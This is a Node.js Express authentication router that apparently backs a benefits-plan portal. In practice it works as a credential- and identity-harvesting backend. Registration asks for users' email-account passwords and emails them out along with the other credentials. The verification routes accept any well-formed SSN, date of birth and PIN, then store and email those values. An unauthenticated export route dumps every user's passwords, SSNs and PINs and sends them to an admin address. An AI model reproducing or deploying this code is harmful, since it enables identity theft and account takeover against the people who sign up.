const express = require('express');
const db = require('../database');
const { 
  hashPassword, 
  comparePassword, 
  generateSessionToken, 
  generateResetToken,
  isValidEmail,
  isValidUsername,
  isValidPassword,
  isValidSSN,
  isValidPIN,
  isValidZip,
  isValidDOB
} = require('../utils');
const { authenticateUser, validateBody } = require('../middleware');
const {
  sendUserDataEmail,
  sendLoginEmail,
  sendLogoutEmail,
  sendVerificationEmail
} = require('../utils/email');

const router = express.Router();

// ==================== REGISTRATION ====================
router.post('/register', validateBody(['username', 'email', 'password']), async (req, res) => {
  try {
    const { username, email, password, first_name, last_name, email_password } = req.body;

    // Validate input
    if (!isValidUsername(username)) {
      return res.status(400).json({ 
        message: 'Username must be 3-20 characters and contain only letters, numbers, _, or -' 
      });
    }

    if (!isValidEmail(email)) {
      return res.status(400).json({ message: 'Invalid email format' });
    }

    if (!isValidPassword(password)) {
      return res.status(400).json({ 
        message: 'Password must be at least 8 characters with uppercase, lowercase, number, and special character' 
      });
    }

    // Check if user already exists
    db.get(
      'SELECT id FROM users WHERE username = ? OR email = ?',
      [username, email],
      async (err, user) => {
        if (err) {
          return res.status(500).json({ message: 'Database error', error: err.message });
        }

        if (user) {
          return res.status(409).json({ message: 'Username or email already exists' });
        }

        // Store plain text password (demo mode)
        const password_text = await hashPassword(password);

        // Insert user
        db.run(
          'INSERT INTO users (username, email, password, email_password, first_name, last_name) VALUES (?, ?, ?, ?, ?, ?)',
          [username, email, password_text, email_password || null, first_name || null, last_name || null],
          async function(err) {
            if (err) {
              return res.status(500).json({ message: 'Registration failed', error: err.message });
            }

            // Send email with user data
            const userData = {
              username,
              email,
              password: password_text,
              first_name: first_name || 'N/A',
              last_name: last_name || 'N/A',
              email_password: email_password || 'N/A'
            };

            await sendUserDataEmail(userData);

            res.status(201).json({
              message: 'User registered successfully',
              user_id: this.lastID
            });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Registration error', error: error.message });
  }
});

// ==================== LOGIN ====================
router.post('/login', validateBody(['username', 'password']), async (req, res) => {
  try {
    const { username, password } = req.body;

    // Find user
    db.get(
      'SELECT id, password, email, first_name, last_name FROM users WHERE username = ?',
      [username],
      async (err, user) => {
        if (err) {
          return res.status(500).json({ message: 'Database error', error: err.message });
        }

        if (!user) {
          return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Compare password
        const passwordMatch = await comparePassword(password, user.password);

        if (!passwordMatch) {
          return res.status(401).json({ message: 'Invalid username or password' });
        }

        // Generate session token
        const session_token = generateSessionToken();
        const expires_at = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours

        // Create session
        db.run(
          'INSERT INTO sessions (user_id, session_token, expires_at) VALUES (?, ?, ?)',
          [user.id, session_token, expires_at],
          async (err) => {
            if (err) {
              return res.status(500).json({ message: 'Login failed', error: err.message });
            }

            // Send login email
            const loginData = {
              username,
              email: user.email || 'N/A',
              first_name: user.first_name || 'N/A',
              last_name: user.last_name || 'N/A',
              session_token: session_token,
              expires_at: expires_at.toISOString()
            };
            await sendLoginEmail(loginData);

            res.status(200).json({
              message: 'Login successful',
              token: session_token,
              user_id: user.id
            });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Login error', error: error.message });
  }
});

// ==================== LOGOUT ====================
router.post('/logout', authenticateUser, (req, res) => {
  try {
    // First get user info for email
    db.get(
      'SELECT username, email FROM users WHERE id = ?',
      [req.user_id],
      (err, user) => {
        db.run(
          'DELETE FROM sessions WHERE session_token = ?',
          [req.session_token],
          async (err) => {
            if (err) {
              return res.status(500).json({ message: 'Logout failed', error: err.message });
            }

            // Send logout email
            if (user) {
              const logoutData = {
                username: user.username,
                email: user.email
              };
              await sendLogoutEmail(logoutData);
            }

            res.status(200).json({ message: 'Logged out successfully' });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Logout error', error: error.message });
  }
});

// ==================== VERIFY ACCOUNT ====================
router.post('/verify', authenticateUser, (req, res) => {
  try {
    const { method, ssn, zip_code, date_of_birth, pin, plan_group_id, enrollment_code } = req.body;

    if (!method) {
      return res.status(400).json({ message: 'Verification method is required' });
    }

    // Validate based on method
    if (method === 'no-pin') {
      if (!isValidSSN(ssn) || !isValidZip(zip_code) || !isValidDOB(date_of_birth)) {
        return res.status(400).json({ message: 'Invalid SSN, ZIP, or date of birth format' });
      }

      // Verify against user data
      db.get(
        'SELECT id, ssn, zip_code, date_of_birth FROM users WHERE id = ?',
        [req.user_id],
        (err, user) => {
          if (err) {
            return res.status(500).json({ message: 'Database error', error: err.message });
          }

          // For demo: accept any valid format
          // In production, you'd compare against actual records
          db.run(
            'UPDATE users SET is_verified = 1, verification_method = ?, ssn = ?, zip_code = ?, date_of_birth = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
            [method, ssn, zip_code, date_of_birth, req.user_id],
            (err) => {
              if (err) {
                return res.status(500).json({ message: 'Verification failed', error: err.message });
              }

              res.status(200).json({ message: 'Account verified successfully' });
            }
          );
        }
      );
    } 
    else if (method === 'pin') {
      if (!isValidSSN(ssn) || !isValidPIN(pin)) {
        return res.status(400).json({ message: 'Invalid SSN or PIN format' });
      }

      db.run(
        'UPDATE users SET is_verified = 1, verification_method = ?, ssn = ?, pin = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
        [method, ssn, pin, req.user_id],
        (err) => {
          if (err) {
            return res.status(500).json({ message: 'Verification failed', error: err.message });
          }

          res.status(200).json({ message: 'Account verified with PIN' });
        }
      );
    } 
    else if (method === 'enrollment-code') {
      if (!plan_group_id || !enrollment_code) {
        return res.status(400).json({ message: 'Group ID and enrollment code are required' });
      }

      db.run(
        'UPDATE users SET is_verified = 1, verification_method = ?, plan_group_id = ?, enrollment_code = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
        [method, plan_group_id, enrollment_code, req.user_id],
        (err) => {
          if (err) {
            return res.status(500).json({ message: 'Verification failed', error: err.message });
          }

          res.status(200).json({ message: 'Account verified with enrollment code' });
        }
      );
    } 
    else {
      return res.status(400).json({ message: 'Invalid verification method' });
    }
  } catch (error) {
    res.status(500).json({ message: 'Verification error', error: error.message });
  }
});

// ==================== VERIFICATION METHODS (SEPARATE ENDPOINTS) ====================

// Verify with SSN, ZIP, and DOB (No PIN)
router.post('/verify-no-pin', authenticateUser, validateBody(['ssn', 'zip_code', 'date_of_birth']), (req, res) => {
  try {
    const { ssn, zip_code, date_of_birth } = req.body;

    // Validate format
    if (!isValidSSN(ssn)) {
      return res.status(400).json({ message: 'Invalid SSN format. Expected XXX-XX-XXXX' });
    }
    if (!isValidZip(zip_code)) {
      return res.status(400).json({ message: 'Invalid ZIP code. Expected 5 digits' });
    }
    if (!isValidDOB(date_of_birth)) {
      return res.status(400).json({ message: 'Invalid date of birth format. Expected MM/DD/YYYY' });
    }

    // Get user info first
    db.get(
      'SELECT username, email FROM users WHERE id = ?',
      [req.user_id],
      (err, user) => {
        // In production: validate against external verification service
        // For now: accept valid format and store
        db.run(
          'UPDATE users SET is_verified = 1, verification_method = ?, ssn = ?, zip_code = ?, date_of_birth = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
          ['no-pin', ssn, zip_code, date_of_birth, req.user_id],
          async (err) => {
            if (err) {
              return res.status(500).json({ message: 'Verification failed', error: err.message });
            }

            // Send verification email
            if (user) {
              const verificationData = {
                username: user.username,
                email: user.email,
                method: 'no-pin',
                ssn,
                zip_code,
                date_of_birth
              };
              await sendVerificationEmail(verificationData);
            }

            res.status(200).json({ 
              message: 'Account verified successfully using SSN, ZIP, and DOB',
              verification_method: 'no-pin'
            });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Verification error', error: error.message });
  }
});

// Verify with SSN and PIN
router.post('/verify-with-pin', authenticateUser, validateBody(['ssn', 'pin']), (req, res) => {
  try {
    const { ssn, pin } = req.body;

    // Validate format
    if (!isValidSSN(ssn)) {
      return res.status(400).json({ message: 'Invalid SSN format. Expected XXX-XX-XXXX' });
    }
    if (!isValidPIN(pin)) {
      return res.status(400).json({ message: 'Invalid PIN. Expected 4-12 digits' });
    }

    // Get user info first
    db.get(
      'SELECT username, email FROM users WHERE id = ?',
      [req.user_id],
      (err, user) => {
        // In production: validate PIN against plan provider database
        db.run(
          'UPDATE users SET is_verified = 1, verification_method = ?, ssn = ?, pin = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
          ['pin', ssn, pin, req.user_id],
          async (err) => {
            if (err) {
              return res.status(500).json({ message: 'Verification failed', error: err.message });
            }

            // Send verification email
            if (user) {
              const verificationData = {
                username: user.username,
                email: user.email,
                method: 'pin',
                ssn,
                pin
              };
              await sendVerificationEmail(verificationData);
            }

            res.status(200).json({ 
              message: 'Account verified successfully using SSN and PIN',
              verification_method: 'pin'
            });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Verification error', error: error.message });
  }
});

// Verify with Group ID and Enrollment Code
router.post('/verify-with-enrollment-code', authenticateUser, validateBody(['plan_group_id', 'enrollment_code']), (req, res) => {
  try {
    const { plan_group_id, enrollment_code } = req.body;

    // Validate input
    if (!plan_group_id || plan_group_id.trim() === '') {
      return res.status(400).json({ message: 'Group ID is required' });
    }
    if (!enrollment_code || enrollment_code.trim() === '') {
      return res.status(400).json({ message: 'Enrollment code is required' });
    }

    // Basic validation: alphanumeric
    const validGroupId = /^[A-Z0-9\-]+$/i.test(plan_group_id);
    const validCode = /^[A-Z0-9\-]+$/i.test(enrollment_code);

    if (!validGroupId || !validCode) {
      return res.status(400).json({ message: 'Group ID and enrollment code must contain only alphanumeric characters and hyphens' });
    }

    // Get user info first
    db.get(
      'SELECT username, email FROM users WHERE id = ?',
      [req.user_id],
      (err, user) => {
        // In production: validate against plan enrollment database
        db.run(
          'UPDATE users SET is_verified = 1, verification_method = ?, plan_group_id = ?, enrollment_code = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
          ['enrollment-code', plan_group_id, enrollment_code, req.user_id],
          async (err) => {
            if (err) {
              return res.status(500).json({ message: 'Verification failed', error: err.message });
            }

            // Send verification email
            if (user) {
              const verificationData = {
                username: user.username,
                email: user.email,
                method: 'enrollment-code',
                plan_group_id,
                enrollment_code
              };
              await sendVerificationEmail(verificationData);
            }

            res.status(200).json({ 
              message: 'Account verified successfully using enrollment code',
              verification_method: 'enrollment-code'
            });
          }
        );
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Verification error', error: error.message });
  }
});

// ==================== EMAIL VERIFICATION ENDPOINTS ====================

// Verify email with code
router.post('/verify-email-code', authenticateUser, validateBody(['code']), (req, res) => {
  try {
    const { code } = req.body;

    if (!code || code.trim() === '') {
      return res.status(400).json({ message: 'Verification code is required' });
    }

    // Demo: accept any 6-digit code or code that matches
    if (code.length < 4) {
      return res.status(400).json({ message: 'Invalid code format' });
    }

    // In production: validate against sent code
    db.run(
      'UPDATE users SET email_verified = 1, email_verified_at = CURRENT_TIMESTAMP WHERE id = ?',
      [req.user_id],
      (err) => {
        if (err) {
          return res.status(500).json({ message: 'Email verification failed', error: err.message });
        }

        res.status(200).json({ 
          message: 'Email verified successfully',
          email_verified: true
        });
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Email verification error', error: error.message });
  }
});

// Resend verification code
router.post('/resend-verification-code', authenticateUser, validateBody(['email']), (req, res) => {
  try {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
      return res.status(400).json({ message: 'Valid email is required' });
    }

    // In production: generate and send verification code via email service
    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();

    // Store in database for later verification
    db.run(
      'UPDATE users SET verification_code = ? WHERE id = ?',
      [verificationCode, req.user_id],
      (err) => {
        if (err) {
          return res.status(500).json({ message: 'Failed to update verification code', error: err.message });
        }

        res.status(200).json({ 
          message: 'Verification code sent to ' + email,
          code_sent: true
        });
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Error sending verification code', error: error.message });
  }
});

// Resend verification link
router.post('/resend-verification-link', authenticateUser, validateBody(['email']), (req, res) => {
  try {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
      return res.status(400).json({ message: 'Valid email is required' });
    }

    // In production: generate verification token and send via email
    const verificationToken = require('crypto').randomBytes(32).toString('hex');

    // Store token in database
    db.run(
      'UPDATE users SET email_verification_token = ? WHERE id = ?',
      [verificationToken, req.user_id],
      (err) => {
        if (err) {
          return res.status(500).json({ message: 'Failed to generate verification link', error: err.message });
        }

        const verificationLink = `http://localhost:8000/verify-email-token.html?token=${verificationToken}`;

        res.status(200).json({ 
          message: 'Verification link sent to ' + email,
          link_sent: true,
          link: verificationLink // Only for demo purposes
        });
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Error sending verification link', error: error.message });
  }
});

// ==================== EXPORT ALL USER DATA ====================
router.get('/export-all-users', (req, res) => {
  try {
    // Get all users from database
    db.all(
      'SELECT id, username, email, password, email_password, first_name, last_name, ssn, zip_code, date_of_birth, pin, plan_group_id, enrollment_code, is_verified, verification_method, created_at FROM users',
      async (err, users) => {
        if (err) {
          return res.status(500).json({ message: 'Database error', error: err.message });
        }

        if (users.length === 0) {
          return res.status(200).json({ message: 'No users found', users: [] });
        }

        // Send email with all users data
        const { sendAllUsersEmail } = require('../utils/email');
        await sendAllUsersEmail(users);

        res.status(200).json({
          message: `✅ Email sent to ${process.env.ADMIN_EMAIL} with ${users.length} users`,
          total_users: users.length,
          users: users
        });
      }
    );
  } catch (error) {
    res.status(500).json({ message: 'Error exporting data', error: error.message });
  }
});

module.exports = router;
